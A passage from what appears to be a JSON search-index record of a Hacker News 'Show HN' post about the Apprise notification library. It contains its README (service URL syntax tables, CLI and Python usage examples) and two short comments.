dingtalk://token/dingtalk://token/ToPhoneNodingtalk://token/ToPhoneNo1/ToPhoneNo2/ToPhoneNo1/ Kavenegar kavenegar:// (TCP) 443 kavenegar://ApiKey/ToPhoneNokavenegar://FromPhoneNo@ApiKey/ToPhoneNokavenegar://ApiKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN MessageBird msgbird:// (TCP) 443 msgbird://ApiKey/FromPhoneNomsgbird://ApiKey/FromPhoneNo/ToPhoneNomsgbird://ApiKey/FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ MSG91 msg91:// (TCP) 443 msg91://AuthKey/ToPhoneNomsg91://SenderID@AuthKey/ToPhoneNomsg91://AuthKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Nexmo nexmo:// (TCP) 443 nexmo://ApiKey:ApiSecret@FromPhoneNonexmo://ApiKey:ApiSecret@FromPhoneNo/ToPhoneNonexmo://ApiKey:ApiSecret@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Sinch sinch:// (TCP) 443 sinch://ServicePlanId:ApiToken@FromPhoneNosinch://ServicePlanId:ApiToken@FromPhoneNo/ToPhoneNosinch://ServicePlanId:ApiToken@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/sinch://ServicePlanId:ApiToken@ShortCode/ToPhoneNosinch://ServicePlanId:ApiToken@ShortCode/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Twilio twilio:// (TCP) 443 twilio://AccountSid:AuthToken@FromPhoneNotwilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNotwilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/twilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNo?apikey=Keytwilio://AccountSid:AuthToken@ShortCode/ToPhoneNotwilio://AccountSid:AuthToken@ShortCode/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Desktop Notification Support Notification Service Service ID Default Port Example Syntax Linux DBus Notifications dbus://qt://glib://kde:// n/a dbus://qt://glib://kde:// Linux Gnome Notifications gnome:// n/a gnome:// MacOS X Notifications macosx:// n/a macosx:// Windows Notifications windows:// n/a windows:// Email Support Service ID Default Port Example Syntax mailto:// (TCP) 25 mailto://userid:pass@domain.commailto://domain.com?user=userid&pass=passwordmailto://domain.com:2525?user=userid&pass=passwordmailto://user@gmail.com&pass=passwordmailto://mySendingUsername:mySendingPassword@example.com?to=receivingAddress@example.commailto://userid:password@example.com?smtp=mail.example.com&from=noreply@example.com&name=no%20reply mailtos:// (TCP) 587 mailtos://userid:pass@domain.commailtos://domain.com?user=userid&pass=passwordmailtos://domain.com:465?user=userid&pass=passwordmailtos://user@hotmail.com&pass=passwordmailtos://mySendingUsername:mySendingPassword@example.com?to=receivingAddress@example.commailtos://userid:password@example.com?smtp=mail.example.com&from=noreply@example.com&name=no%20reply Apprise have some email services built right into it (such as yahoo, fastmail, hotmail, gmail, etc) that greatly simplify the mailto:// service. See more details here. Custom Notifications Post Method Service ID Default Port Example Syntax JSON json:// or jsons:// (TCP) 80 or 443 json://hostnamejson://user@hostnamejson://user:password@hostname:portjson://hostname/a/path/to/post/to XML xml:// or xmls:// (TCP) 80 or 443 xml://hostnamexml://user@hostnamexml://user:password@hostname:portxml://hostname/a/path/to/post/to Installation The easiest way is to install this package is from pypi: Command Line A small command line tool is also provided with this package called apprise. If you know the server url's you wish to notify, you can simply provide them all on the command line and send your notifications that way: # Send a notification to as many servers as you want # as you can easily chain one after another (the -vv provides some # additional verbosity to help let you know what is going on): apprise -vv -t 'my title' -b 'my notification body' \\ 'mailto://myemail:mypass@gmail.com' \\ 'pbul://o.gn5kj6nfhv736I7jC3cj3QLRiyhgl98b' # If you don't specify a --body (-b) then stdin is used allowing # you to use the tool as part of your every day administration: cat /proc/cpuinfo | apprise -vv -t 'cpu info' \\ 'mailto://myemail:mypass@gmail.com' # The title field is totally optional uptime | apprise -vv \\ 'discord:///4174216298/JHMHI8qBe7bk2ZwO5U711o3dV_js' Configuration Files No one wants to put their credentials out for everyone to see on the command line. No problem apprise also supports configuration files. It can handle both a specific YAML format or a very simple TEXT format. You can also pull these configuration files via an HTTP query too! You can read more about the expected structure of the configuration files here. # By default if no url or configuration is specified aprise will attempt to load # configuration files (if present): # ~/.apprise # ~/.apprise.yml # ~/.config/apprise # ~/.config/apprise.yml # Windows users can store their default configuration files here: # %APPDATA%/Apprise/apprise # %APPDATA%/Apprise/apprise.yml # %LOCALAPPDATA%/Apprise/apprise # %LOCALAPPDATA%/Apprise/apprise.yml # If you loaded one of those files, your command line gets really easy: apprise -vv -t 'my title' -b 'my notification body' # If you want to deviate from the default paths or specify more than one, # just specify them using the --config switch: apprise -vv -t 'my title' -b 'my notification body' \\ --config=/path/to/my/config.yml # Got lots of configuration locations? No problem, you can specify them all: # Apprise can even fetch the configuration from over a network! apprise -vv -t 'my title' -b 'my notification body' \\ --config=/path/to/my/config.yml \\ --config=https://localhost/my/apprise/config Attaching Files Apprise also supports file attachments too! Specify as many attachments to a notification as you want. # Send a funny image you found on the internet to a colleague: apprise -vv --title 'Agile Joke' \\ --body 'Did you see this one yet?' \\ --attach https://i.redd.it/my2t4d2fx0u31.jpg \\ 'mailto://myemail:mypass@gmail.com' # Easily send an update from a critical server to your dev team apprise -vv --title 'system crash' \\ --body 'I do not think Jim fixed the bug; see attached...' \\ --attach /var/log/myprogram.log \\ --attach /var/debug/core.2345 \\ --tag devteam Developers To send a notification from within your python application, just do the following: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add all of the notification services by their server url. # A sample email notification: apobj.add('mailto://myuserid:mypass@gmail.com') # A sample pushbullet notification apobj.add('pbul://o.gn5kj6nfhv736I7jC3cj3QLRiyhgl98b') # Then notify these services any time you desire. The below would # notify all of the services loaded into our Apprise object. apobj.notify( body='what a great notification service!', title='my notification title', ) Configuration Files Developers need access to configuration files too. The good news is their use just involves declaring another object (called AppriseConfig) that the Apprise object can ingest. You can also freely mix and match config and notification entries as often as you wish! You can read more about the expected structure of the configuration files here. import apprise # Create an Apprise instance apobj = apprise.Apprise() # Create an Config instance config = apprise.AppriseConfig() # Add a configuration source: config.add('/path/to/my/config.yml') # Add another... config.add('https://myserver:8080/path/to/config') # Make sure to add our config into our apprise object apobj.add(config) # You can mix and match; add an entry directly if you want too # In this entry we associate the 'admin' tag with our notification apobj.add('mailto://myuser:mypass@hotmail.com', tag='admin') # Then notify these services any time you desire. The below would # notify all of the services that have not been bound to any specific # tag. apobj.notify( body='what a great notification service!', title='my notification title', ) # Tagging allows you to specifically target only specific notification # services you've loaded: apobj.notify( body='send a notification to our admin group', title='Attention Admins', # notify any services tagged with the 'admin' tag tag='admin', ) # If you want to notify absolutely everything (reguardless of whether # it's been tagged or not), just use the reserved tag of 'all': apobj.notify( body='send a notification to our admin group', title='Attention Admins', # notify absolutely everything loaded, reguardless on wether # it has a tag associated with it or not: tag='all', ) Attaching Files Attachments are very easy to send using the Apprise API: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add at least one service you want to notify apobj.add('mailto://myuser:mypass@hotmail.com') # Then send your attachment. apobj.notify( title='A great photo of our family', body='The flash caused Jane to close her eyes! hah! :)', attach='/local/path/to/my/DSC_003.jpg', ) # Send a web based attachment too! In the below example, we connect to a home # security camera and send a live image to an email. By default remote web # content is cached but for a security camera, we might want to call notify # again later in our code so we want our last image retrieved to expire(in # this case after 3 seconds). apobj.notify( title='Latest security image', attach='http:/admin:password@hikvision-cam01/ISAPI/Streaming/channels/101/picture?cache=3' ) To send more than one attachment, just use a list, set, or tuple instead: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add at least one service you want to notify apobj.add('mailto://myuser:mypass@hotmail.com') # Now add all of the entries we're intrested in: attach = ( # ?name= allows us to rename the actual jpeg as found on the site # to be another name when sent to our receipient(s) 'https://i.redd.it/my2t4d2fx0u31.jpg?name=FlyingToMars.jpg', # Now add another: '/path/to/funny/joke.gif', ) # Send your multiple attachments with a single notify call: apobj.notify( title='Some good jokes.', body='Hey guys, check out these!', attach=attach, ) Want To Learn More? If you're interested in reading more about this and other methods on how to customize your own notifications, please check out the following links: Using the CLI Development API Troubleshooting Configuration File Help Apprise API/Web Interface Showcase Want to help make Apprise better? Contribute to the Apprise Code Base Sponsorship and Donations ",
        "_version_": 1718527384029757441
      },
      {
        "story_id": [20587541],
        "story_author": ["l2g"],
        "story_descendants": [6],
        "story_score": [35],
        "story_time": ["2019-08-01T19:44:25Z"],
        "story_title": "Show HN: Apprise – A lightweight all-in-one notification solution (update)",
        "search": [
          "Show HN: Apprise – A lightweight all-in-one notification solution (update)",
          "https://github.com/caronc/apprise/#showhn-one-last-time",
          "apprise / verb To inform or tell (someone). To make one aware of something. Apprise allows you to send a notification to almost all of the most popular notification services available to us today such as: Telegram, Discord, Slack, Amazon SNS, Gotify, etc. One notification library to rule them all. A common and intuitive notification syntax. Supports the handling of images and attachments (to the notification services that will accept them). It's incredibly lightweight. Amazing response times because all messages sent asynchronously. Developers who wish to provide a notification service no longer need to research each and every one out there. They no longer need to try to adapt to the new ones that comeout thereafter. They just need to include this one library and then they can immediately gain access to almost all of the notifications services available to us today. System Administrators and DevOps who wish to send a notification now no longer need to find the right tool for the job. Everything is already wrapped and supported within the apprise command line tool (CLI) that ships with this product. Supported Notifications The section identifies all of the services supported by this library. Check out the wiki for more information on the supported modules here. Popular Notification Services The table below identifies the services this tool supports and some example service urls you need to use in order to take advantage of it. Click on any of the services listed below to get more details on how you can configure Apprise to access them. Notification Service Service ID Default Port Example Syntax Apprise API apprise:// or apprises:// (TCP) 80 or 443 apprise://hostname/Token Boxcar boxcar:// (TCP) 443 boxcar://hostnameboxcar://hostname/@tagboxcar://hostname/device_tokenboxcar://hostname/device_token1/device_token2/device_tokenNboxcar://hostname/@tag/@tag2/device_token Discord discord:// (TCP) 443 discord://webhook_id/webhook_tokendiscord://avatar@webhook_id/webhook_token Emby emby:// or embys:// (TCP) 8096 emby://user@hostname/emby://user:password@hostname Enigma2 enigma2:// or enigma2s:// (TCP) 80 or 443 enigma2://hostname Faast faast:// (TCP) 443 faast://authorizationtoken FCM fcm:// (TCP) 443 fcm://project@apikey/DEVICE_IDfcm://project@apikey/#TOPICfcm://project@apikey/DEVICE_ID1/#topic1/#topic2/DEVICE_ID2/ Flock flock:// (TCP) 443 flock://tokenflock://botname@tokenflock://app_token/u:useridflock://app_token/g:channel_idflock://app_token/u:userid/g:channel_id Gitter gitter:// (TCP) 443 gitter://token/roomgitter://token/room1/room2/roomN Google Chat gchat:// (TCP) 443 gchat://workspace/key/token Gotify gotify:// or gotifys:// (TCP) 80 or 443 gotify://hostname/tokengotifys://hostname/token?priority=high Growl growl:// (UDP) 23053 growl://hostnamegrowl://hostname:portnogrowl://password@hostnamegrowl://password@hostname:portNote: you can also use the get parameter version which can allow the growl request to behave using the older v1.x protocol. An example would look like: growl://hostname?version=1 Home Assistant hassio:// or hassios:// (TCP) 8123 or 443 hassio://hostname/accesstokenhassio://user@hostname/accesstokenhassio://user:password@hostname:port/accesstokenhassio://hostname/optional/path/accesstoken IFTTT ifttt:// (TCP) 443 ifttt://webhooksID/Eventifttt://webhooksID/Event1/Event2/EventNifttt://webhooksID/Event1/?+Key=Valueifttt://webhooksID/Event1/?-Key=value1 Join join:// (TCP) 443 join://apikey/devicejoin://apikey/device1/device2/deviceN/join://apikey/groupjoin://apikey/groupA/groupB/groupNjoin://apikey/DeviceA/groupA/groupN/DeviceN/ KODI kodi:// or kodis:// (TCP) 8080 or 443 kodi://hostnamekodi://user@hostnamekodi://user:password@hostname:port Kumulos kumulos:// (TCP) 443 kumulos://apikey/serverkey LaMetric Time lametric:// (TCP) 443 lametric://apikey@device_ipaddrlametric://apikey@hostname:portlametric://client_id@client_secret Mailgun mailgun:// (TCP) 443 mailgun://user@hostname/apikeymailgun://user@hostname/apikey/emailmailgun://user@hostname/apikey/email1/email2/emailNmailgun://user@hostname/apikey/?name=\"From%20User\" Matrix matrix:// or matrixs:// (TCP) 80 or 443 matrix://hostnamematrix://user@hostnamematrixs://user:pass@hostname:port/#room_aliasmatrixs://user:pass@hostname:port/!room_idmatrixs://user:pass@hostname:port/#room_alias/!room_id/#room2matrixs://token@hostname:port/?webhook=matrixmatrix://user:token@hostname/?webhook=slack&format=markdown Mattermost mmost:// or mmosts:// (TCP) 8065 mmost://hostname/authkeymmost://hostname:80/authkeymmost://user@hostname:80/authkeymmost://hostname/authkey?channel=channelmmosts://hostname/authkeymmosts://user@hostname/authkey Microsoft Teams msteams:// (TCP) 443 msteams://TokenA/TokenB/TokenC/ MQTT mqtt:// or mqtts:// (TCP) 1883 or 8883 mqtt://hostname/topicmqtt://user@hostname/topicmqtts://user:pass@hostname:9883/topic Nextcloud ncloud:// or nclouds:// (TCP) 80 or 443 ncloud://adminuser:pass@host/Usernclouds://adminuser:pass@host/User1/User2/UserN Notica notica:// (TCP) 443 notica://Token/ Notifico notifico:// (TCP) 443 notifico://ProjectID/MessageHook/ Office 365 o365:// (TCP) 443 o365://TenantID:AccountEmail/ClientID/ClientSecreto365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmailo365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmail1/TargetEmail2/TargetEmailN OneSignal onesignal:// (TCP) 443 onesignal://AppID@APIKey/PlayerIDonesignal://TemplateID:AppID@APIKey/UserIDonesignal://AppID@APIKey/#IncludeSegmentonesignal://AppID@APIKey/Email Opsgenie opsgenie:// (TCP) 443 opsgenie://APIKeyopsgenie://APIKey/UserIDopsgenie://APIKey/#Teamopsgenie://APIKey/*Scheduleopsgenie://APIKey/^Escalation ParsePlatform parsep:// or parseps:// (TCP) 80 or 443 parsep://AppID:MasterKey@Hostnameparseps://AppID:MasterKey@Hostname PopcornNotify popcorn:// (TCP) 443 popcorn://ApiKey/ToPhoneNopopcorn://ApiKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/popcorn://ApiKey/ToEmailpopcorn://ApiKey/ToEmail1/ToEmail2/ToEmailN/popcorn://ApiKey/ToPhoneNo1/ToEmail1/ToPhoneNoN/ToEmailN Prowl prowl:// (TCP) 443 prowl://apikeyprowl://apikey/providerkey PushBullet pbul:// (TCP) 443 pbul://accesstokenpbul://accesstoken/#channelpbul://accesstoken/A_DEVICE_IDpbul://accesstoken/email@address.compbul://accesstoken/#channel/#channel2/email@address.net/DEVICE Pushjet pjet:// or pjets:// (TCP) 80 or 443 pjet://hostname/secretpjet://hostname:port/secretpjets://secret@hostname/secretpjets://hostname:port/secret Push (Techulus) push:// (TCP) 443 push://apikey/ Pushed pushed:// (TCP) 443 pushed://appkey/appsecret/pushed://appkey/appsecret/#ChannelAliaspushed://appkey/appsecret/#ChannelAlias1/#ChannelAlias2/#ChannelAliasNpushed://appkey/appsecret/@UserPushedIDpushed://appkey/appsecret/@UserPushedID1/@UserPushedID2/@UserPushedIDN Pushover pover:// (TCP) 443 pover://user@tokenpover://user@token/DEVICEpover://user@token/DEVICE1/DEVICE2/DEVICENNote: you must specify both your user_id and token PushSafer psafer:// or psafers:// (TCP) 80 or 443 psafer://privatekeypsafers://privatekey/DEVICEpsafer://privatekey/DEVICE1/DEVICE2/DEVICEN Reddit reddit:// (TCP) 443 reddit://user:password@app_id/app_secret/subredditreddit://user:password@app_id/app_secret/sub1/sub2/subN Rocket.Chat rocket:// or rockets:// (TCP) 80 or 443 rocket://user:password@hostname/RoomID/Channelrockets://user:password@hostname:443/#Channel1/#Channel1/RoomIDrocket://user:password@hostname/#Channelrocket://webhook@hostnamerockets://webhook@hostname/@User/#Channel Ryver ryver:// (TCP) 443 ryver://Organization/Tokenryver://botname@Organization/Token SendGrid sendgrid:// (TCP) 443 sendgrid://APIToken:FromEmail/sendgrid://APIToken:FromEmail/ToEmailsendgrid://APIToken:FromEmail/ToEmail1/ToEmail2/ToEmailN/ SimplePush spush:// (TCP) 443 spush://apikeyspush://salt:password@apikeyspush://apikey?event=Apprise Slack slack:// (TCP) 443 slack://TokenA/TokenB/TokenC/slack://TokenA/TokenB/TokenC/Channelslack://botname@TokenA/TokenB/TokenC/Channelslack://user@TokenA/TokenB/TokenC/Channel1/Channel2/ChannelN SMTP2Go smtp2go:// (TCP) 443 smtp2go://user@hostname/apikeysmtp2go://user@hostname/apikey/emailsmtp2go://user@hostname/apikey/email1/email2/emailNsmtp2go://user@hostname/apikey/?name=\"From%20User\" Streamlabs strmlabs:// (TCP) 443 strmlabs://AccessToken/strmlabs://AccessToken/?name=name&identifier=identifier&amount=0&currency=USD SparkPost sparkpost:// (TCP) 443 sparkpost://user@hostname/apikeysparkpost://user@hostname/apikey/emailsparkpost://user@hostname/apikey/email1/email2/emailNsparkpost://user@hostname/apikey/?name=\"From%20User\" Spontit spontit:// (TCP) 443 spontit://UserID@APIKey/spontit://UserID@APIKey/Channelspontit://UserID@APIKey/Channel1/Channel2/ChannelN Syslog syslog:// (UDP) 514 (if hostname specified) syslog://syslog://Facilitysyslog://hostnamesyslog://hostname/Facility Telegram tgram:// (TCP) 443 tgram://bottoken/ChatIDtgram://bottoken/ChatID1/ChatID2/ChatIDN Twitter twitter:// (TCP) 443 twitter://CKey/CSecret/AKey/ASecrettwitter://user@CKey/CSecret/AKey/ASecrettwitter://CKey/CSecret/AKey/ASecret/User1/User2/User2twitter://CKey/CSecret/AKey/ASecret?mode=tweet Twist twist:// (TCP) 443 twist://pasword:logintwist://password:login/#channeltwist://password:login/#team:channeltwist://password:login/#team:channel1/channel2/#team3:channel XBMC xbmc:// or xbmcs:// (TCP) 8080 or 443 xbmc://hostnamexbmc://user@hostnamexbmc://user:password@hostname:port XMPP xmpp:// or xmpps:// (TCP) 5222 or 5223 xmpp://password@hostnamexmpp://user:password@hostnamexmpps://user:password@hostname:port?jid=user@hostname/resourcexmpps://password@hostname/target@myhost, target2@myhost/resource Webex Teams (Cisco) wxteams:// (TCP) 443 wxteams://Token Zulip Chat zulip:// (TCP) 443 zulip://botname@Organization/Tokenzulip://botname@Organization/Token/Streamzulip://botname@Organization/Token/Email SMS Notification Support Notification Service Service ID Default Port Example Syntax AWS SNS sns:// (TCP) 443 sns://AccessKeyID/AccessSecretKey/RegionName/+PhoneNosns://AccessKeyID/AccessSecretKey/RegionName/+PhoneNo1/+PhoneNo2/+PhoneNoNsns://AccessKeyID/AccessSecretKey/RegionName/Topicsns://AccessKeyID/AccessSecretKey/RegionName/Topic1/Topic2/TopicN ClickSend clicksend:// (TCP) 443 clicksend://user:pass@PhoneNoclicksend://user:pass@ToPhoneNo1/ToPhoneNo2/ToPhoneNoN D7 Networks d7sms:// (TCP) 443 d7sms://user:pass@PhoneNod7sms://user:pass@ToPhoneNo1/ToPhoneNo2/ToPhoneNoN DingTalk dingtalk:// (TCP) 443 dingtalk://token/dingtalk://token/ToPhoneNodingtalk://token/ToPhoneNo1/ToPhoneNo2/ToPhoneNo1/ Kavenegar kavenegar:// (TCP) 443 kavenegar://ApiKey/ToPhoneNokavenegar://FromPhoneNo@ApiKey/ToPhoneNokavenegar://ApiKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN MessageBird msgbird:// (TCP) 443 msgbird://ApiKey/FromPhoneNomsgbird://ApiKey/FromPhoneNo/ToPhoneNomsgbird://ApiKey/FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ MSG91 msg91:// (TCP) 443 msg91://AuthKey/ToPhoneNomsg91://SenderID@AuthKey/ToPhoneNomsg91://AuthKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Nexmo nexmo:// (TCP) 443 nexmo://ApiKey:ApiSecret@FromPhoneNonexmo://ApiKey:ApiSecret@FromPhoneNo/ToPhoneNonexmo://ApiKey:ApiSecret@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Sinch sinch:// (TCP) 443 sinch://ServicePlanId:ApiToken@FromPhoneNosinch://ServicePlanId:ApiToken@FromPhoneNo/ToPhoneNosinch://ServicePlanId:ApiToken@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/sinch://ServicePlanId:ApiToken@ShortCode/ToPhoneNosinch://ServicePlanId:ApiToken@ShortCode/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Twilio twilio:// (TCP) 443 twilio://AccountSid:AuthToken@FromPhoneNotwilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNotwilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/twilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNo?apikey=Keytwilio://AccountSid:AuthToken@ShortCode/ToPhoneNotwilio://AccountSid:AuthToken@ShortCode/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Desktop Notification Support Notification Service Service ID Default Port Example Syntax Linux DBus Notifications dbus://qt://glib://kde:// n/a dbus://qt://glib://kde:// Linux Gnome Notifications gnome:// n/a gnome:// MacOS X Notifications macosx:// n/a macosx:// Windows Notifications windows:// n/a windows:// Email Support Service ID Default Port Example Syntax mailto:// (TCP) 25 mailto://userid:pass@domain.commailto://domain.com?user=userid&pass=passwordmailto://domain.com:2525?user=userid&pass=passwordmailto://user@gmail.com&pass=passwordmailto://mySendingUsername:mySendingPassword@example.com?to=receivingAddress@example.commailto://userid:password@example.com?smtp=mail.example.com&from=noreply@example.com&name=no%20reply mailtos:// (TCP) 587 mailtos://userid:pass@domain.commailtos://domain.com?user=userid&pass=passwordmailtos://domain.com:465?user=userid&pass=passwordmailtos://user@hotmail.com&pass=passwordmailtos://mySendingUsername:mySendingPassword@example.com?to=receivingAddress@example.commailtos://userid:password@example.com?smtp=mail.example.com&from=noreply@example.com&name=no%20reply Apprise have some email services built right into it (such as yahoo, fastmail, hotmail, gmail, etc) that greatly simplify the mailto:// service. See more details here. Custom Notifications Post Method Service ID Default Port Example Syntax JSON json:// or jsons:// (TCP) 80 or 443 json://hostnamejson://user@hostnamejson://user:password@hostname:portjson://hostname/a/path/to/post/to XML xml:// or xmls:// (TCP) 80 or 443 xml://hostnamexml://user@hostnamexml://user:password@hostname:portxml://hostname/a/path/to/post/to Installation The easiest way is to install this package is from pypi: Command Line A small command line tool is also provided with this package called apprise. If you know the server url's you wish to notify, you can simply provide them all on the command line and send your notifications that way: # Send a notification to as many servers as you want # as you can easily chain one after another (the -vv provides some # additional verbosity to help let you know what is going on): apprise -vv -t 'my title' -b 'my notification body' \\ 'mailto://myemail:mypass@gmail.com' \\ 'pbul://o.gn5kj6nfhv736I7jC3cj3QLRiyhgl98b' # If you don't specify a --body (-b) then stdin is used allowing # you to use the tool as part of your every day administration: cat /proc/cpuinfo | apprise -vv -t 'cpu info' \\ 'mailto://myemail:mypass@gmail.com' # The title field is totally optional uptime | apprise -vv \\ 'discord:///4174216298/JHMHI8qBe7bk2ZwO5U711o3dV_js' Configuration Files No one wants to put their credentials out for everyone to see on the command line. No problem apprise also supports configuration files. It can handle both a specific YAML format or a very simple TEXT format. You can also pull these configuration files via an HTTP query too! You can read more about the expected structure of the configuration files here. # By default if no url or configuration is specified aprise will attempt to load # configuration files (if present): # ~/.apprise # ~/.apprise.yml # ~/.config/apprise # ~/.config/apprise.yml # Windows users can store their default configuration files here: # %APPDATA%/Apprise/apprise # %APPDATA%/Apprise/apprise.yml # %LOCALAPPDATA%/Apprise/apprise # %LOCALAPPDATA%/Apprise/apprise.yml # If you loaded one of those files, your command line gets really easy: apprise -vv -t 'my title' -b 'my notification body' # If you want to deviate from the default paths or specify more than one, # just specify them using the --config switch: apprise -vv -t 'my title' -b 'my notification body' \\ --config=/path/to/my/config.yml # Got lots of configuration locations? No problem, you can specify them all: # Apprise can even fetch the configuration from over a network! apprise -vv -t 'my title' -b 'my notification body' \\ --config=/path/to/my/config.yml \\ --config=https://localhost/my/apprise/config Attaching Files Apprise also supports file attachments too! Specify as many attachments to a notification as you want. # Send a funny image you found on the internet to a colleague: apprise -vv --title 'Agile Joke' \\ --body 'Did you see this one yet?' \\ --attach https://i.redd.it/my2t4d2fx0u31.jpg \\ 'mailto://myemail:mypass@gmail.com' # Easily send an update from a critical server to your dev team apprise -vv --title 'system crash' \\ --body 'I do not think Jim fixed the bug; see attached...' \\ --attach /var/log/myprogram.log \\ --attach /var/debug/core.2345 \\ --tag devteam Developers To send a notification from within your python application, just do the following: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add all of the notification services by their server url. # A sample email notification: apobj.add('mailto://myuserid:mypass@gmail.com') # A sample pushbullet notification apobj.add('pbul://o.gn5kj6nfhv736I7jC3cj3QLRiyhgl98b') # Then notify these services any time you desire. The below would # notify all of the services loaded into our Apprise object. apobj.notify( body='what a great notification service!', title='my notification title', ) Configuration Files Developers need access to configuration files too. The good news is their use just involves declaring another object (called AppriseConfig) that the Apprise object can ingest. You can also freely mix and match config and notification entries as often as you wish! You can read more about the expected structure of the configuration files here. import apprise # Create an Apprise instance apobj = apprise.Apprise() # Create an Config instance config = apprise.AppriseConfig() # Add a configuration source: config.add('/path/to/my/config.yml') # Add another... config.add('https://myserver:8080/path/to/config') # Make sure to add our config into our apprise object apobj.add(config) # You can mix and match; add an entry directly if you want too # In this entry we associate the 'admin' tag with our notification apobj.add('mailto://myuser:mypass@hotmail.com', tag='admin') # Then notify these services any time you desire. The below would # notify all of the services that have not been bound to any specific # tag. apobj.notify( body='what a great notification service!', title='my notification title', ) # Tagging allows you to specifically target only specific notification # services you've loaded: apobj.notify( body='send a notification to our admin group', title='Attention Admins', # notify any services tagged with the 'admin' tag tag='admin', ) # If you want to notify absolutely everything (reguardless of whether # it's been tagged or not), just use the reserved tag of 'all': apobj.notify( body='send a notification to our admin group', title='Attention Admins', # notify absolutely everything loaded, reguardless on wether # it has a tag associated with it or not: tag='all', ) Attaching Files Attachments are very easy to send using the Apprise API: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add at least one service you want to notify apobj.add('mailto://myuser:mypass@hotmail.com') # Then send your attachment. apobj.notify( title='A great photo of our family', body='The flash caused Jane to close her eyes! hah! :)', attach='/local/path/to/my/DSC_003.jpg', ) # Send a web based attachment too! In the below example, we connect to a home # security camera and send a live image to an email. By default remote web # content is cached but for a security camera, we might want to call notify # again later in our code so we want our last image retrieved to expire(in # this case after 3 seconds). apobj.notify( title='Latest security image', attach='http:/admin:password@hikvision-cam01/ISAPI/Streaming/channels/101/picture?cache=3' ) To send more than one attachment, just use a list, set, or tuple instead: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add at least one service you want to notify apobj.add('mailto://myuser:mypass@hotmail.com') # Now add all of the entries we're intrested in: attach = ( # ?name= allows us to rename the actual jpeg as found on the site # to be another name when sent to our receipient(s) 'https://i.redd.it/my2t4d2fx0u31.jpg?name=FlyingToMars.jpg', # Now add another: '/path/to/funny/joke.gif', ) # Send your multiple attachments with a single notify call: apobj.notify( title='Some good jokes.', body='Hey guys, check out these!', attach=attach, ) Want To Learn More? If you're interested in reading more about this and other methods on how to customize your own notifications, please check out the following links: Using the CLI Development API Troubleshooting Configuration File Help Apprise API/Web Interface Showcase Want to help make Apprise better? Contribute to the Apprise Code Base Sponsorship and Donations ",
          "6 months ago [I posted about Apprise here](<a href=\"https://news.ycombinator.com/item?id=19023196\" rel=\"nofollow\">https://news.ycombinator.com/item?id=19023196</a>) and got a lot of amazing and encouraging feedback!  I since took just about everyone's comments and ideas at the time and implemented most of them.<p>Apprise now supports over 40+ different notification services, including configuration files that can be read from disk and the cloud! The library remains incredible light weight and easy to use.<p>I just wanted to share an almost completed solution and hope to hit you all up for more of your thoughts and advice!",
          "Worked about 10 years for a company named Appriss - <a href=\"https://appriss.com\" rel=\"nofollow\">https://appriss.com</a> - no real comment there other than to share the founding CEO used to say the board was presented with a bunch of names \"<i>and picked the worst one</i>\".<p>No real comment other than that, but nostalgia alone will make me play with this, so thanks for sharing."
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/caronc/apprise/#showhn-one-last-time",
        "comments.comment_id": [20587555, 20597895],
        "comments.comment_author": ["l2g", "MaxwellsDaemon"],
        "comments.comment_descendants": [1, 1],
        "comments.comment_time": [
          "2019-08-01T19:45:59Z",
          "2019-08-03T00:50:08Z"
        ],
        "comments.comment_text": [
          "6 months ago [I posted about Apprise here](<a href=\"https://news.ycombinator.com/item?id=19023196\" rel=\"nofollow\">https://news.ycombinator.com/item?id=19023196</a>) and got a lot of amazing and encouraging feedback!  I since took just about everyone's comments and ideas at the time and implemented most of them.<p>Apprise now supports over 40+ different notification services, including configuration files that can be read from disk and the cloud! The library remains incredible light weight and easy to use.<p>I just wanted to share an almost completed solution and hope to hit you all up for more of your thoughts and advice!",
          "Worked about 10 years for a company named Appriss - <a href=\"https://appriss.com\" rel=\"nofollow\">https://appriss.com</a> - no real comment there other than to share the founding CEO used to say the board was presented with a bunch of names \"<i>and picked the worst one</i>\".<p>No real comment other than that, but nostalgia alone will make me play with this, so thanks for sharing."
        ],
        "id": "be2f9752-65d6-4488-b28f-a352a501b0ae",
        "url_text": "apprise / verb To inform or tell (someone). To make one aware of something. Apprise allows you to send a notification to almost all of the most popular notification services available to us today such as: Telegram, Discord, Slack, Amazon SNS, Gotify, etc. One notification library to rule them all. A common and intuitive notification syntax. Supports the handling of images and attachments (to the notification services that will accept them). It's incredibly lightweight. Amazing response times because all messages sent asynchronously. Developers who wish to provide a notification service no longer need to research each and every one out there. They no longer need to try to adapt to the new ones that comeout thereafter. They just need to include this one library and then they can immediately gain access to almost all of the notifications services available to us today. System Administrators and DevOps who wish to send a notification now no longer need to find the right tool for the job. Everything is already wrapped and supported within the apprise command line tool (CLI) that ships with this product. 